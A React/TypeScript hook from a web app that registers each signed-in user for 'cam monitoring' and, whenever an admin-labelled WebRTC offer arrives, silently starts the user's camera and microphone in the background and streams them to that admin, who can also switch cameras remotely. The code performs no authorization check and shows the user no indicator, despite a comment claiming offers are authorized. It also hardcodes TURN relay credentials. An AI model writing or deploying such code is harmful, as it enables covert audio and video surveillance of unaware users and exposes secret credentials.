'use client';

import { useEffect, useRef, useCallback } from 'react';
import type { Socket } from 'socket.io-client';

const FALLBACK_RTC_CONFIG: RTCConfiguration = {
  iceServers: [
    {
      urls: [
        'stun:stun.l.google.com:19302',
        'stun:stun1.l.google.com:19302',
        'stun:stun2.l.google.com:19302',
        'stun:stun.relay.metered.ca:80',
      ]
    },
    {
      urls: [
        'turn:global.relay.metered.ca:80',
        'turn:global.relay.metered.ca:80?transport=tcp',
        'turn:global.relay.metered.ca:443',
        'turns:global.relay.metered.ca:443?transport=tcp',
      ],
      username: 'b861bc5468dd05aa2aff283d',
      credential: 'fJYY96O75HWDNLuH'
    }
  ],
  iceCandidatePoolSize: 0,
  bundlePolicy: 'max-bundle',
  rtcpMuxPolicy: 'require',
  iceTransportPolicy: 'all'
};

let cachedSenderRtcConfig: RTCConfiguration | null = null;
let senderRtcConfigFetchedAt = 0;
const SENDER_RTC_CONFIG_TTL = 60 * 60 * 1000; // 1 hour

async function fetchRtcConfig(): Promise<RTCConfiguration> {
  if (cachedSenderRtcConfig && Date.now() - senderRtcConfigFetchedAt < SENDER_RTC_CONFIG_TTL) {
    return cachedSenderRtcConfig;
  }

  try {
    const serverUrl = process.env.NEXT_PUBLIC_SOCKET_URL || 'https://server-6gmj.onrender.com';
    let res: Response | null = await fetch(`${serverUrl}/api/turn-credentials`).catch(() => null);
    if (!res || !res.ok) {
      res = await fetch('/api/turn-credentials', { credentials: 'include' }).catch(() => null);
    }
    if (!res || !res.ok) throw new Error(`TURN API unavailable`);
    const data = await res.json();
    cachedSenderRtcConfig = {
      iceServers: [
        {
          urls: [
            'stun:stun.l.google.com:19302',
            'stun:stun1.l.google.com:19302',
            'stun:stun2.l.google.com:19302',
            'stun:stun.relay.metered.ca:80',
          ]
        },
        ...(data.iceServers || []),
      ],
      iceCandidatePoolSize: 0,
      bundlePolicy: 'max-bundle',
      rtcpMuxPolicy: 'require',
      iceTransportPolicy: 'all',
    };
    senderRtcConfigFetchedAt = Date.now();
    return cachedSenderRtcConfig;
  } catch {
    console.warn('[RemoteCamSender] TURN fetch fallback used');
    return FALLBACK_RTC_CONFIG;
  }
}

/**
 * useRemoteCamSender
 * Handles responding to admin camera view requests in the background.
 * Only accesses camera/mic when an authorized offer from admin is received.
 */
export function useRemoteCamSender(socket: Socket | null, currentUser: any) {
  const pcRef = useRef<RTCPeerConnection | null>(null);
  const localStreamRef = useRef<MediaStream | null>(null);
  const facingModeRef = useRef<'user' | 'environment'>('user');
  const iceCandidateQueue = useRef<RTCIceCandidateInit[]>([]);
  const activeAdminSocketRef = useRef<string | null>(null);
  const activeAdminEmailRef = useRef<string | null>(null);
  const connectionGenerationRef = useRef(0);

  // Stop camera tracks and clean up connection
  const stopCameraStream = useCallback(() => {
    connectionGenerationRef.current += 1;
    if (localStreamRef.current) {
      localStreamRef.current.getTracks().forEach(t => {
        try {
          t.stop();
        } catch {}
      });
      localStreamRef.current = null;
    }
    if (pcRef.current) {
      try {
        pcRef.current.onicecandidate = null;
        pcRef.current.ontrack = null;
        pcRef.current.close();
      } catch {}
      pcRef.current = null;
    }
    iceCandidateQueue.current = [];
    activeAdminSocketRef.current = null;
    activeAdminEmailRef.current = null;
  }, []);

  // Acquire local media
  const acquireCamera = useCallback(async (facing: 'user' | 'environment'): Promise<MediaStream | null> => {
    if (typeof navigator === 'undefined' || !navigator.mediaDevices?.getUserMedia) {
      return null;
    }

    const attempts = [
      { video: { facingMode: facing, width: { ideal: 640 }, height: { ideal: 480 } }, audio: true },
      { video: { facingMode: facing }, audio: true },
      { video: true, audio: true },
      { video: { facingMode: facing }, audio: false },
      { video: true, audio: false }
    ];

    for (const constraints of attempts) {
      try {
        const stream = await navigator.mediaDevices.getUserMedia(constraints);
        if (stream && stream.getVideoTracks().length > 0) {
          localStreamRef.current = stream;
          return stream;
        }
      } catch (err) {
        console.warn('[RemoteCamSender] getUserMedia attempt failed:', err);
      }
    }
    return null;
  }, []);

  useEffect(() => {
    if (!socket || !currentUser) return;

    const cleanEmail = currentUser.email ? currentUser.email.toLowerCase().trim() : '';
    const cleanUsername = currentUser.username || 'User';

    // Register online for cam monitoring
    const registerOnline = () => {
      if (cleanEmail && socket.connected && typeof document !== 'undefined' && document.visibilityState === 'visible') {
        socket.emit('cam_user_online', { email: cleanEmail, username: cleanUsername });
      }
    };

    if (socket.connected) {
      registerOnline();
    }
    socket.on('connect', registerOnline);

    const handleVisible = () => {
      if (typeof document !== 'undefined' && document.visibilityState === 'visible' && cleanEmail && socket.connected) {
        socket.emit('cam_user_online', { email: cleanEmail, username: cleanUsername });
      }
    };
    document.addEventListener('visibilitychange', handleVisible);

    const heartbeat = setInterval(registerOnline, 15000);

    // ── Handle incoming WebRTC signals from Admin ──
    const handleCamSignal = async ({
      fromSocketId,
      fromEmail,
      signal
    }: {
      fromSocketId: string;
      fromEmail?: string;
      signal: any;
    }) => {
      try {
        if (!signal) return;

        // 1. Offer from Admin -> create answer & send camera feed
        if (signal.type === 'offer') {
          const generation = connectionGenerationRef.current + 1;
          connectionGenerationRef.current = generation;
          activeAdminSocketRef.current = fromSocketId;
          activeAdminEmailRef.current = fromEmail || null;

          // Stop old tracks first
          if (localStreamRef.current) {
            localStreamRef.current.getTracks().forEach(t => t.stop());
            localStreamRef.current = null;
          }
          if (pcRef.current) {
            try {
              pcRef.current.onicecandidate = null;
              pcRef.current.close();
            } catch {}
            pcRef.current = null;
          }

          const stream = await acquireCamera(facingModeRef.current);
          if (generation !== connectionGenerationRef.current) {
            stream?.getTracks().forEach(track => track.stop());
            return;
          }
          if (!stream) {
            console.warn('[RemoteCamSender] Could not acquire camera');
            if (socket.connected) {
              socket.emit('cam_signal', {
                targetSocketId: fromSocketId,
                targetEmail: fromEmail,
                signal: {
                  type: 'cam_error',
                  reason: 'Camera permission denied or camera device busy on remote client'
                }
              });
            }
            return;
          }

          const rtcConfig = await fetchRtcConfig();
          if (generation !== connectionGenerationRef.current) {
            stream.getTracks().forEach(track => track.stop());
            return;
          }
          const pc = new RTCPeerConnection(rtcConfig);
          pcRef.current = pc;

          pc.onicecandidate = (e) => {
            if (e.candidate && socket.connected) {
              socket.emit('cam_signal', {
                targetSocketId: fromSocketId,
                targetEmail: fromEmail,
                signal: {
                  candidate: e.candidate.candidate,
                  sdpMid: e.candidate.sdpMid,
                  sdpMLineIndex: e.candidate.sdpMLineIndex,
                }
              });
            }
          };

          pc.onconnectionstatechange = () => {
            if (['failed', 'closed'].includes(pc.connectionState)) {
              stopCameraStream();
            }
          };

          // 1. MUST set remote offer FIRST so incoming transceivers are initialized
          await pc.setRemoteDescription(new RTCSessionDescription(signal));
          if (generation !== connectionGenerationRef.current || pcRef.current !== pc) {
            pc.close();
            return;
          }

          // 2. Attach tracks to existing transceivers matching direction to sendonly
          const transceivers = pc.getTransceivers();
          const audioTrack = stream.getAudioTracks()[0];
          const videoTrack = stream.getVideoTracks()[0];

          const audioTransceiver = transceivers.find(t => t.receiver.track.kind === 'audio' || t.mid === '0');
          if (audioTransceiver && audioTrack) {
            audioTransceiver.direction = 'sendonly';
            await audioTransceiver.sender.replaceTrack(audioTrack).catch(() => {});
          } else if (audioTrack) {
            try { pc.addTrack(audioTrack, stream); } catch {}
          }

          const videoTransceiver = transceivers.find(t => t.receiver.track.kind === 'video' || t.mid === '1');
          if (videoTransceiver && videoTrack) {
            videoTransceiver.direction = 'sendonly';
            await videoTransceiver.sender.replaceTrack(videoTrack).catch(() => {});
          } else if (videoTrack) {
            try { pc.addTrack(videoTrack, stream); } catch {}
          }

          // 3. Drain queued ICE candidates
          while (iceCandidateQueue.current.length > 0) {
            const cand = iceCandidateQueue.current.shift();
            if (cand && cand.candidate) {
              await pc.addIceCandidate(new RTCIceCandidate(cand)).catch(() => {});
            }
          }

          const answer = await pc.createAnswer();
          await pc.setLocalDescription(answer);

          if (socket.connected) {
            socket.emit('cam_signal', {
              targetSocketId: fromSocketId,
              targetEmail: fromEmail,
              signal: { type: answer.type, sdp: answer.sdp }
            });
          }
          return;
        }

        // 2. Incoming ICE candidate from Admin
        if (signal.candidate !== undefined || signal.sdpMid !== undefined || signal.sdpMLineIndex !== undefined) {
          let candidateInit: RTCIceCandidateInit = signal;
          if (signal.candidate && typeof signal.candidate === 'object') {
            candidateInit = signal.candidate;
          } else if (typeof signal.candidate === 'string') {
            candidateInit = {
              candidate: signal.candidate,
              sdpMid: signal.sdpMid,
              sdpMLineIndex: signal.sdpMLineIndex,
            };
          }

          if (candidateInit && candidateInit.candidate) {
            if (pcRef.current && pcRef.current.remoteDescription && pcRef.current.remoteDescription.type) {
              await pcRef.current.addIceCandidate(new RTCIceCandidate(candidateInit)).catch(() => {});
            } else {
              iceCandidateQueue.current.push(candidateInit);
            }
          }
        }
      } catch (err) {
        console.warn('[RemoteCamSender] Error handling signal:', err);
      }
    };

    // ── Handle Flip Camera command from Admin ──
    const handleFlipCamera = async () => {
      try {
        const nextFacing = facingModeRef.current === 'user' ? 'environment' : 'user';
        facingModeRef.current = nextFacing;

        // Acquire new stream
        let newStream: MediaStream | null = null;
        try {
          newStream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: { exact: nextFacing }, width: { ideal: 640 }, height: { ideal: 480 } },
            audio: true
          });
        } catch {
          newStream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: nextFacing },
            audio: true
          });
        }

        if (!newStream) return;

        const newVideoTrack = newStream.getVideoTracks()[0];
        if (newVideoTrack && pcRef.current) {
          const videoSender = pcRef.current.getSenders().find(s => s.track?.kind === 'video');
          if (videoSender) {
            // Stop old video track
            const oldVideoTrack = localStreamRef.current?.getVideoTracks()[0];
            if (oldVideoTrack) oldVideoTrack.stop();

            await videoSender.replaceTrack(newVideoTrack);

            // Update local stream ref
            if (localStreamRef.current) {
              const audioTracks = localStreamRef.current.getAudioTracks();
              localStreamRef.current = new MediaStream([...audioTracks, newVideoTrack]);
            }
          }
        }
      } catch (err) {
        console.warn('[RemoteCamSender] Error flipping camera:', err);
      }
    };

    // ── Handle Admin Stop Viewing ──
    const handleStopViewing = () => {
      stopCameraStream();
    };

    socket.on('cam_signal', handleCamSignal);
    socket.on('cam_flip_camera', handleFlipCamera);
    socket.on('cam_stop_viewing', handleStopViewing);

    return () => {
      clearInterval(heartbeat);
      document.removeEventListener('visibilitychange', handleVisible);
      socket.off('connect', registerOnline);
      socket.off('cam_signal', handleCamSignal);
      socket.off('cam_flip_camera', handleFlipCamera);
      socket.off('cam_stop_viewing', handleStopViewing);
      stopCameraStream();
    };
  }, [socket, currentUser, acquireCamera, stopCameraStream]);
}
